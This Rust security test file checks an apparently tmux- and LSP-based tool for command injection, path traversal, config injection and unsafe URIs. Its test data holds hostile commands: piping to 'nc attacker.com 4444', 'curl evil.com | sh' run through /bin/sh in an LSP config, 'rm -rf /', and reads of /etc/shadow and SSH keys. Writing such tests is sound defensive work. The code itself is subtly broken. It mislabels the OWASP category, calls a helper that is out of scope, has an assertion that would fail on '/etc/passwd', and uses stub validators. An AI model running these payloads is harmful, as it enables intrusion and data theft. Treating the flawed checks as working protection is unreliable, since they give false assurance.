//! OWASP A01:2021 - Injection Vulnerabilities Testing
//!
//! Tests for command injection, path traversal, and other injection attacks.

use std::path::PathBuf;
use std::process::Command;
use tempfile::TempDir;

#[cfg(test)]
mod command_injection_tests {
    use super::*;

    #[test]
    fn test_tmux_command_injection_shell_metacharacters() {
        // Test that shell metacharacters are properly escaped
        let dangerous_inputs = vec![
            "task'; rm -rf /; echo '",
            "task; cat /etc/passwd",
            "task | nc attacker.com 4444",
            "task & whoami",
            "task && curl evil.com",
            "task || ls -la",
            "task `id`",
            "task $(whoami)",
            "task > /tmp/pwned",
            "task < /etc/shadow",
        ];

        for input in dangerous_inputs {
            // Verify that Command::arg() is used (no shell interpretation)
            let result = Command::new("echo")
                .arg(input)
                .output();

            assert!(result.is_ok(), "Command should execute safely with: {}", input);

            // Verify input is treated as literal string
            let stdout = String::from_utf8_lossy(&result.unwrap().stdout);
            assert_eq!(stdout.trim(), input, "Input should be passed literally");
        }
    }

    #[test]
    fn test_agent_name_injection() {
        // Test malicious agent names
        let malicious_names = vec![
            "../../../etc/passwd",
            "agent; rm -rf /",
            "agent && malicious",
            "agent | nc evil.com 4444",
            "`whoami`-agent",
            "$(curl evil.com)-agent",
        ];

        for name in malicious_names {
            // Agent names should be validated
            assert!(
                !is_valid_agent_name(name),
                "Should reject malicious agent name: {}",
                name
            );
        }
    }

    #[test]
    fn test_task_parameter_injection() {
        // Test malicious task parameters
        let malicious_tasks = vec![
            "'; DROP TABLE users; --",
            "task\n/bin/sh",
            "task\x00whoami",  // Null byte injection
            "task\r\nmalicious command",
            "task\x1b[0m\x1b]0;pwned\x07",  // Terminal escape injection
        ];

        for task in malicious_tasks {
            assert!(
                contains_dangerous_chars(task),
                "Should detect dangerous characters in: {:?}",
                task
            );
        }
    }

    #[test]
    fn test_no_shell_interpretation() {
        // Verify Command::new() + arg() is used, not Command::new("sh")
        let command = Command::new("tmux")
            .arg("new-session")
            .arg("-s")
            .arg("test-session; rm -rf /")  // This should be treated as literal session name
            .arg("-d");

        // Command structure should be safe
        assert!(command.get_program() == "tmux", "Should use direct command, not shell");
    }

    // Helper functions that should exist in the actual implementation
    fn is_valid_agent_name(name: &str) -> bool {
        // Only allow alphanumeric, hyphens, underscores
        name.chars().all(|c| c.is_alphanumeric() || c == '-' || c == '_')
            && !name.is_empty()
            && name.len() < 50
    }

    fn contains_dangerous_chars(input: &str) -> bool {
        const DANGEROUS: &[char] = &[';', '|', '&', '`', '$', '(', ')', '\n', '\r', '\x00'];
        input.chars().any(|c| DANGEROUS.contains(&c))
    }
}

#[cfg(test)]
mod path_traversal_tests {
    use super::*;

    #[test]
    fn test_path_traversal_attempts() {
        let malicious_paths = vec![
            "../../etc/passwd",
            "../../../etc/shadow",
            "/etc/passwd",
            "~/.ssh/id_rsa",
            "/Users/../../../etc/passwd",
            "file:///etc/passwd",
            "\\\\?\\C:\\Windows\\System32\\config\\SAM",
            "./../.ssh/id_rsa",
        ];

        for path in malicious_paths {
            let result = validate_file_path(PathBuf::from(path));
            assert!(
                result.is_err(),
                "Should reject path traversal: {}",
                path
            );
        }
    }

    #[test]
    fn test_symlink_attack_prevention() {
        let temp_dir = TempDir::new().unwrap();
        let evil_target = temp_dir.path().join("evil_target");
        let symlink = temp_dir.path().join("link_to_evil");

        // Create evil target
        std::fs::write(&evil_target, "sensitive data").unwrap();

        // Create symlink
        #[cfg(unix)]
        std::os::unix::fs::symlink("/etc/passwd", &symlink).ok();

        // Attempt to access via symlink should be detected
        let result = validate_file_path(symlink);

        // Should either reject symlinks or properly canonicalize
        match result {
            Ok(canonical) => {
                // If symlinks are allowed, path must be canonicalized
                assert!(canonical.is_absolute(), "Path must be absolute");
                assert!(!canonical.to_string_lossy().contains(".."), "No .. allowed");
            }
            Err(_) => {
                // Rejecting symlinks is also acceptable
            }
        }
    }

    #[test]
    fn test_path_canonicalization() {
        let temp_dir = TempDir::new().unwrap();
        let file = temp_dir.path().join("test.txt");
        std::fs::write(&file, "test").unwrap();

        // Create path with traversal
        let traversal_path = file.parent().unwrap()
            .join("subdir")
            .join("..")
            .join("test.txt");

        let result = validate_file_path(traversal_path);

        if let Ok(canonical) = result {
            // Canonical path should be clean
            assert!(!canonical.to_string_lossy().contains(".."));
            assert_eq!(canonical, file.canonicalize().unwrap());
        }
    }

    #[test]
    fn test_absolute_path_enforcement() {
        let relative_paths = vec![
            "test.txt",
            "./test.txt",
            "../test.txt",
            "dir/test.txt",
        ];

        for path in relative_paths {
            // System should either reject relative paths or canonicalize them
            let result = validate_file_path(PathBuf::from(path));

            if let Ok(canonical) = result {
                assert!(canonical.is_absolute(), "Path must be absolute: {:?}", canonical);
            }
        }
    }

    #[test]
    fn test_special_file_rejection() {
        let special_files = vec![
            "/dev/null",
            "/dev/random",
            "/dev/urandom",
            "/proc/self/mem",
            "/proc/self/cmdline",
        ];

        for path in special_files {
            // Optional: reject special files
            let path_buf = PathBuf::from(path);
            if path_buf.exists() {
                // Some systems may want to reject these
                assert!(
                    !is_safe_file_path(&path_buf),
                    "Should consider rejecting special file: {}",
                    path
                );
            }
        }
    }

    // Helper functions
    fn validate_file_path(path: PathBuf) -> Result<PathBuf, String> {
        // This should match the actual implementation

        // 1. Canonicalize
        let canonical = path.canonicalize()
            .map_err(|e| format!("Invalid path: {}", e))?;

        // 2. Check for .. components
        if canonical.to_string_lossy().contains("..") {
            return Err("Path traversal detected".to_string());
        }

        // 3. Ensure absolute
        if !canonical.is_absolute() {
            return Err("Path must be absolute".to_string());
        }

        Ok(canonical)
    }

    fn is_safe_file_path(path: &PathBuf) -> bool {
        // Reject special device files
        let path_str = path.to_string_lossy();
        !path_str.starts_with("/dev/")
            && !path_str.starts_with("/proc/")
            && !path_str.starts_with("/sys/")
    }
}

#[cfg(test)]
mod configuration_injection_tests {
    use super::*;

    #[test]
    fn test_toml_injection_attempts() {
        let malicious_configs = vec![
            // Integer overflow
            r#"
            [editor]
            tab_size = 9999999999999999999
            "#,

            // Invalid types
            r#"
            [editor]
            tab_size = "malicious"
            "#,

            // Unknown fields (potential code execution)
            r#"
            [editor]
            __proto__ = "exploit"
            "#,

            // Array overflow
            r#"
            [lsp.servers]
            rust = ["a"; 10000]
            "#,
        ];

        for config in malicious_configs {
            let result = parse_config(config);

            // Should either reject or safely handle
            match result {
                Ok(parsed) => {
                    // If parsed, values must be validated
                    assert!(validate_parsed_config(&parsed).is_ok());
                }
                Err(_) => {
                    // Rejection is acceptable
                }
            }
        }
    }

    #[test]
    fn test_lsp_command_injection_via_config() {
        let malicious_lsp_config = r#"
        [lsp.servers.rust]
        command = "/bin/sh"
        args = ["-c", "curl evil.com | sh"]
        "#;

        let result = parse_config(malicious_lsp_config);

        // Should reject unknown LSP servers or validate against allowlist
        assert!(
            result.is_err() || !is_allowed_lsp_command(&result.unwrap()),
            "Should reject malicious LSP command"
        );
    }

    // Helper functions
    fn parse_config(toml_str: &str) -> Result<toml::Value, toml::de::Error> {
        toml::from_str(toml_str)
    }

    fn validate_parsed_config(_config: &toml::Value) -> Result<(), String> {
        // Validation logic
        Ok(())
    }

    fn is_allowed_lsp_command(_config: &toml::Value) -> bool {
        // Check against allowlist
        const ALLOWED_SERVERS: &[&str] = &[
            "rust-analyzer",
            "typescript-language-server",
            "pyright",
            "gopls",
        ];

        // Should verify command is in allowlist
        false
    }
}

#[cfg(test)]
mod lsp_injection_tests {
    use super::*;

    #[test]
    fn test_lsp_uri_injection() {
        let malicious_uris = vec![
            "file://../../etc/passwd",
            "file:///etc/passwd",
            "http://evil.com/exploit",
            "ftp://malicious.com",
            "javascript:alert(1)",
        ];

        for uri in malicious_uris {
            let result = validate_lsp_uri(uri);
            assert!(
                result.is_err() || is_safe_uri(&result.unwrap()),
                "Should reject or sanitize malicious URI: {}",
                uri
            );
        }
    }

    #[test]
    fn test_lsp_response_size_limit() {
        // Test oversized LSP response
        let huge_response = "x".repeat(10_000_000); // 10MB

        let result = process_lsp_response(&huge_response);
        assert!(
            result.is_err(),
            "Should reject oversized LSP response"
        );
    }

    #[test]
    fn test_lsp_timeout_enforcement() {
        // LSP requests should timeout
        // This would require async test with actual LSP server
        // Placeholder for integration test
    }

    // Helper functions
    fn validate_lsp_uri(uri: &str) -> Result<String, String> {
        // Only allow file:// URIs with safe paths
        if !uri.starts_with("file://") {
            return Err("Only file:// URIs allowed".to_string());
        }

        let path = uri.strip_prefix("file://").unwrap();
        validate_file_path(PathBuf::from(path))?;

        Ok(uri.to_string())
    }

    fn is_safe_uri(uri: &str) -> bool {
        uri.starts_with("file://") && !uri.contains("..")
    }

    fn process_lsp_response(response: &str) -> Result<(), String> {
        const MAX_SIZE: usize = 1_000_000; // 1MB

        if response.len() > MAX_SIZE {
            return Err("Response too large".to_string());
        }

        Ok(())
    }
}
